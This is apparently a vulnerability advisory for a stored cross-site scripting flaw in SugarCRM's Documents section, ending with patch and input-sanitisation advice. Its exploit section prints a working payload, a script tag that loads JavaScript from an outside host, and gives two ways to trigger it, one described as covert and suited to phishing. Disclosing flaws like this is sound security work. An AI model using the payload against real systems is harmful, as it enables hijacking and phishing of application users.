Validated Vulnerable: 

All previous version of SugarCRM prior to 5.5.0a and 5.2.0l 


Discussion: 


A Stored Cross-Site Scripting (XSS) vulnerability was found within
SugarCRM. The vulnerability is exploited through the online Documents
section of the application. By crafting a name that includes XSS code it
is possible to inject malicious data, redirect the user to a bogus
replica of the real website, or other nefariousactivity. 



Exploit: 

There are two ways that have been used to exploit this vulnerability. In
both instances, make a document with the following Document Name: 


pwn3d<SCRIPT SRC="http://www.jeromiejackson.com/sugarcrm.js"></SCRIPT>



Example #1


Within the SugarCRM User Interface (UI) go to the Documents List. Click
on the one just created. This will execute the script. You will see the
script right in the document list- very obvious to most users that
something doesn't look right. The next example is slighly more covert.



Example #2


Within the SugarCRM UI go to the Document List. Hover over the Document
Name you just created, right-click, and then copy the URL location. You
will see the URL does not have any of the scripting, it has been
replaced with queries directly to a Record variable within the
application. This would probably be the tact a Phisher would take.



Solution: 

A patch has been made available via the vendor. It is recommended a
routine to sanitize user input be consistently implemented throughout
the application to mitigate other such occurrences within the
application.
